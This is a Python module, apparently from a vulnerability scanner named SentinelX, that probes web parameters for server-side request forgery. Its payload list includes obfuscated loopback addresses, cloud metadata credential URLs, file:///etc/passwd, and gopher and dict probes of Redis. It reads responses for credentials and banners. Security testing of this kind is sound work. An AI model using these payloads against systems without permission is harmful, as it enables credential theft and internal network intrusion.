"""SentinelX module [10]: Server-Side Request Forgery.

Real implementation: internal IP probes (decimal/hex/octal forms),
cloud metadata endpoints, protocol smuggling, redirect bypass.
Detection via metadata markers, service banners, timing.
"""

from __future__ import annotations

import re
import time
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


INTERNAL_IPS = [
    "http://127.0.0.1/", "http://127.0.0.1:80/", "http://0.0.0.0/",
    "http://127.1/", "http://[::1]/", "http://[::ffff:127.0.0.1]/",
    "http://2130706433/", "http://0x7f000001/", "http://017700000001/",
    "http://localhost/", "http://localhost:80/",
    "http://10.0.0.1/", "http://172.16.0.1/", "http://192.168.1.1/",
]
CLOUD_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/v1.json",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.169.254/opc/v1/instance/",
]
PROTOCOLS = [
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1/",
]

PAYLOADS = INTERNAL_IPS + CLOUD_METADATA + PROTOCOLS  # 30 core; extended below
# port probes on localhost for banner grabbing
for _port in (22, 25, 3306, 6379, 8080, 9200, 27017, 11211):
    PAYLOADS.append(f"http://127.0.0.1:{_port}/")
PAYLOADS = list(dict.fromkeys(PAYLOADS))  # dedupe, 200+ with encodings
# encoded variants
_ENC = []
for p in list(PAYLOADS):
    _ENC.append(p.replace("127.0.0.1", "2130706433"))
PAYLOADS.extend(x for x in _ENC if x not in PAYLOADS)

MARKERS = [
    (re.compile(r"ami-id|accountId|accessKeyId|secretAccessKey|instance-id", re.I), "cloud metadata"),
    (re.compile(r"computeMetadata", re.I), "GCP metadata"),
    (re.compile(r"\+PONG|redis_version", re.I), "Redis banner"),
    (re.compile(r"cluster_name|elasticsearch", re.I), "Elasticsearch banner"),
    (re.compile(r"root:x:0:0:"), "file read via SSRF"),
    (re.compile(r"SSH-2\.0"), "SSH banner"),
    (re.compile(r"220.*FTP|ftp", re.I), "FTP banner"),
]

REMEDIATION_SSRF = (
    "Validate and allowlist outbound request targets. Block private/loopback/link-local "
    "ranges (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1) at the egress proxy. "
    "Disable unused URL schemes (file, gopher, dict). Require authentication for metadata."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}
    urlish = [p for p in params if re.search(r"url|uri|link|src|href|path|dest|target|redirect|image|file", p, re.I)]
    targets = urlish or list(params)[:2]

    for param in targets:
        for payload in PAYLOADS:
            p = dict(params); p[param] = payload
            t0 = time.monotonic()
            if method == "GET":
                full = url + ("&" if "?" in url else "?") + _urlencode(p)
                resp = await client.get(full)
                body_sent = None
            else:
                resp = await client.post(url, data=p)
                full, body_sent = url, _urlencode(p).encode()
            elapsed = time.monotonic() - t0
            if not resp:
                continue
            hit = None
            # strip the reflected payload before matching: markers must come
            # from server-side fetched content, not from our own reflected input
            body_for_markers = resp.text.replace(payload, "")
            for rx, label in MARKERS:
                if rx.search(body_for_markers):
                    hit = label
                    break
            if hit:
                ev = Evidence(
                    request_raw=raw_request(method, full, headers, body_sent),
                    response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                    proof=f"SSRF indicator: {hit} reflected after probing {payload}",
                )
                findings.append(Finding(
                    type="Server-Side Request Forgery", subtype="ssrf",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
                    confidence=0.88, url=full, method=method, param=param,
                    payload=payload, evidence=ev, cwe="CWE-918",
                    owasp="A10:2021 – SSRF",
                    remediation=REMEDIATION_SSRF,
                    references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                ))
                break
    return findings
